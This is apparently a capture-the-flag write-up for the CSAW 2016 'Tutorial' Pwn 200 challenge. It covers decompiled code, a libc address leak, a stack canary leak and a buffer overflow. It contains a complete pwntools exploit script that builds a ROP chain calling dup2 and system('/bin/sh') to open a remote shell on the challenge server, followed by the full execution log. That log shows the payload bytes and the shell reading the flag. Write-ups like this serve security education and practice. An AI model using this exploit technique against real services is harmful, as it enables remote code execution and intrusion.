# Tutorial Pwn 200



Running the application there is immediately a seg fault.
```language-bash
λ  ./tutorial
Segmentation fault (core dumped)
```

Open in ida to see whats going on.

```language-c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){

  v15 = *MK_FP(__FS__, 40LL);
  optval = 1;
  sigemptyset(&v4);
  fd = socket(2, 1, 0);
  if ( fd == -1 )
  {
    perror("socket");
    exit(-1);
  }
  bzero(&s, 0x10uLL);
  if ( setsockopt(fd, 1, 2, &optval, 4u) == -1 )
  {
    perror("setsocket");
    exit(-1);
  }
  s = 2;
  v13 = htonl(0);
  v3 = atoi(a2[1]);
  v12 = htons(v3);
  if ( bind(fd, &s, 0x10u) == -1 )
  {
    perror("bind");
    exit(-1);
  }
  if ( listen(fd, 20) == -1 )
  {
    perror("listen");
    exit(-1);
  }
}
```
From the main funciton we can see that running tutorial, you need to give it a valid port number to create and bind a socket.

So running ` ./tutorial 1234 ` will and connecting to the socket will give us the following
```language-bash
λ nc localhost 1234
-Tutorial-
1.Manual
2.Practice
3.Quit
>1
Reference:0x7fa99023e0d0

-Tutorial-
1.Manual
2.Practice
3.Quit
>2
Time to test your exploit...
>asfsdfadsfadsfadsfsdadsdfasdfa
asfsdfadsfadsfadsfsdadsdfasdfa
��
  J�~� ��y-Tutorial-
1.Manual
2.Practice
3.Quit
```

So it seems that the memory address `Reference:0x7fa99023e0d0` is some sort of leak. Another might happen after trying to display the non ascii text after submitting option 2. Looking at the reference function in ida


```language-c
_int64 __fastcall reference(int a1){
  char *v1; // ST18_8@1
  char s; // [rsp+20h] [rbp-40h]@1
  __int64 v4; // [rsp+58h] [rbp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  v1 = dlsym(0xFFFFFFFFFFFFFFFFLL, "puts");
  write(a1, "Reference:", 0xAuLL);
  sprintf(&s, "%p\n", v1 - 1280); // 1280 = 0x500
  write(a1, &s, 0xFuLL);
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

### Memory Leak of puts Address

So looking at the psuedo code generated by IDA it seems that address of puts is being leaked, so that means that we can find the base address of libc with 500 subtracted.

The second memory address leak might be in 2. Practice option because non readable text was outputted

### Canary

```language-c
test_exploit(int a1){
  char overwrite_me; // [rsp+10h] [rbp-140h]@1
  __int64 v3; // [rsp+148h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  bzero(&overwrite_me, 0x12CuLL);
  write(a1, "Time to test your exploit...\n", 035uLL);
  write(a1, ">", 1uLL);
  read(a1, &overwrite_me, 460uLL);
  write(a1, &overwrite_me, 324uLL);
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

So `overwrite_me` takes in 460 into variable but only 324 is actually going to be used. That leaves 130 something bytes of tasty memory we can play with after overwriting canary successfully.


Now we can start building the exploit

#### Exploit Summary

1. Grab libc base address from choosing option 1.
2. choose option 2 and grab canary
3. choose option 2, input canary, and give payload


## Exploit

```language-python
from pwn import *

context(arch='amd64', os='linux')
context.log_level =False


binary      = ELF('tutorial')
libc        = ELF('libc-2.19.so') #used to by rop
canary      = 0x0


conn        = remote('pwn.chal.csaw.io', 8002)


def calcLibcAddress():

    conn.recvuntil('>')
    conn.sendline('1'); ## this will

    puts_addr = conn.recvline().split(':')[1]
    #do string manipulation, 0x500 was subtracted from puts in the binary
    puts_addr = int(puts_addr, 16) + 0x500
    #god damn pwn tools is nice.
    libc.address = puts_addr - libc.symbols['puts']

    print ('\nLibc Address: 0x%x\n\n' % libc.address)


    #======LETS FIND THE CANARY========
def getCanary():
    conn.recvuntil(">")
    conn.sendline('2')

    conn.recvuntil('>')
    #send empty line
    conn.sendline()

    #get the crap
    canary = conn.recv(0x144)[0x138:0x138 + 0x8]

    print ("\nCanary: 0x%s \n\n" % canary.encode('hex') )
    return canary



    #========I'M SALIVATING  ========
def honeyGetMeTheRop():
    rop = ROP([binary, libc])
    # dup2 will be used to redirect stdin/out to the socket

    #uses the two binarys to build rop chains
    #rop.raw() is used to build stack frames
    # dup2(4, 0)
    rop.raw(rop.find_gadget(['pop rdi', 'ret']))
    rop.raw(0x4)
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x0)
    rop.raw(libc.symbols['dup2'])

    # dup2(4, 1)
    rop.raw(rop.find_gadget(['pop rsi', 'ret']))
    rop.raw(0x1)
    rop.raw(libc.symbols['dup2'])

    FLAGS_OUT_FOR_HARAM_BASH = next(libc.search('/bin/sh'))

    rop.system(FLAGS_OUT_FOR_HARAM_BASH)

    return rop

##==========HONEY I OVERWROTE THE KIDS============
def theKidsWereMemoryLeaksAnyways(canary, rop):
    conn.recvuntil('>')
    conn.sendline('2')
    conn.recvuntil('>')
    #0x138 = 312 & 312/4 = 78
    exploit = 'Meme' * 78 + canary + 'Meme' *2 + bytes(rop)
    conn.sendline(exploit)
    conn.interactive()


if __name__ == "__main__":
    calcLibcAddress()
    canary = getCanary()
    rop = honeyGetMeTheRop()
    theKidsWereMemoryLeaksAnyways(canary, rop)

```






# Executing the Exploit

```language-bash
python exploit.py
[*] '/home/kettle/work/ctf/csaw2016/pwn/tutorial-200/tutorial'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
[*] '/home/kettle/work/ctf/csaw2016/pwn/tutorial-200/libc-2.19.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.chal.csaw.io on port 8002: Done
[DEBUG] Received 0xb bytes:
    '-Tutorial-\n'
[DEBUG] Received 0x1c bytes:
    '1.Manual\n'
    '2.Practice\n'
    '3.Quit\n'
    '>'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0xa bytes:
    'Reference:'
[DEBUG] Received 0x36 bytes:
    '0x7fad235d3860\n'
    '-Tutorial-\n'
    '1.Manual\n'
    '2.Practice\n'
    '3.Quit\n'
    '>'

Libc Address: 0x7fad23564000


[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x1d bytes:
    'Time to test your exploit...\n'
[DEBUG] Received 0x1 bytes:
    '>'
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[DEBUG] Received 0x144 bytes:
    00000000  0a 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000130  00 00 00 00  00 00 00 00  00 b1 98 67  90 5d c9 70  │····│····│···g│·]·p│
    00000140  d0 67 2f c1                                         │·g/·││
    00000144

Canary: 0x00b19867905dc970


[*] Loaded cached gadgets for 'tutorial'
[*] Loaded cached gadgets for 'libc-2.19.so'
[DEBUG] Received 0x27 bytes:
    '-Tutorial-\n'
    '1.Manual\n'
    '2.Practice\n'
    '3.Quit\n'
    '>'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x1d bytes:
    'Time to test your exploit...\n'
[DEBUG] Received 0x1 bytes:
    '>'
[DEBUG] Sent 0x1a9 bytes:
    00000000  4d 65 6d 65  4d 65 6d 65  4d 65 6d 65  4d 65 6d 65  │Meme│Meme│Meme│Meme│
    *
    00000130  4d 65 6d 65  4d 65 6d 65  00 b1 98 67  90 5d c9 70  │Meme│Meme│···g│·]·p│
    00000140  4d 65 6d 65  4d 65 6d 65  e3 12 40 00  00 00 00 00  │Meme│Meme│··@·│····│
    00000150  04 00 00 00  00 00 00 00  85 88 58 23  ad 7f 00 00  │····│····│··X#│····│
    00000160  00 00 00 00  00 00 00 00  90 fe 64 23  ad 7f 00 00  │····│····│··d#│····│
    00000170  85 88 58 23  ad 7f 00 00  01 00 00 00  00 00 00 00  │··X#│····│····│····│
    00000180  90 fe 64 23  ad 7f 00 00  e3 12 40 00  00 00 00 00  │··d#│····│··@·│····│
    00000190  c3 08 6e 23  ad 7f 00 00  90 a5 5a 23  ad 7f 00 00  │··n#│····│··Z#│····│
    000001a0  77 61 61 61  78 61 61 61  0a                        │waaa│xaaa│·│
    000001a9
[*] Switching to interactive mode
[DEBUG] Received 0x144 bytes:
    00000000  4d 65 6d 65  4d 65 6d 65  4d 65 6d 65  4d 65 6d 65  │Meme│Meme│Meme│Meme│
    *
    00000130  4d 65 6d 65  4d 65 6d 65  00 b1 98 67  90 5d c9 70  │Meme│Meme│···g│·]·p│
    00000140  4d 65 6d 65                                         │Meme││
    00000144
MemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMemeMeme\x00\xb1\x98g\x90]�pMeme$ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x1d bytes:
    'flag.txt\n'
    'tutorial\n'
    'tutorial.c\n'
flag.txt
tutorial
tutorial.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x2d bytes:
    'FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}\n'
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
$

```
